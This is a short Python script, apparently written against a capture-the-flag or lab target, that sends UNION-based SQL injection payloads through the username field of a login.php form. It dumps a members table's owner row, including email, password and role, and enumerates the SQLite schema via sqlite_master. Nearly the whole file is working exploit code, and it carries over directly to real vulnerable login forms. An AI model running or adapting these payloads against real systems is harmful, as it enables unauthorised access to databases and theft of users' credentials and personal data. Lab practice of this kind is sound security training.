import requests, re

BASE = "http://6033bc60-27f0-4b34-aef3-14d892d241b2.red.cyberkent.uz"

def sqli_status(payload):
    r = requests.post(f"{BASE}/login.php", data={"username": payload, "password": "x"}, timeout=10)
    m = re.search(r'<div class="status-box">(.*?)</div>', r.text, re.S)
    return m.group(1) if m else "(no status box)"

# full owner row dump (all 6 columns)
print("OWNER ROW:", sqli_status(
    "zzznouser' UNION SELECT 1, id || '|' || username || '|' || email || '|' || password || '|' || role || '|' || status, 3 FROM members WHERE username='owner'-- -"
))

print("BEFORE reset request - schema recheck (any new tables?):")
print(sqli_status("zzznouser' UNION SELECT 1,GROUP_CONCAT(name || ':' || type),3 FROM sqlite_master-- -"))
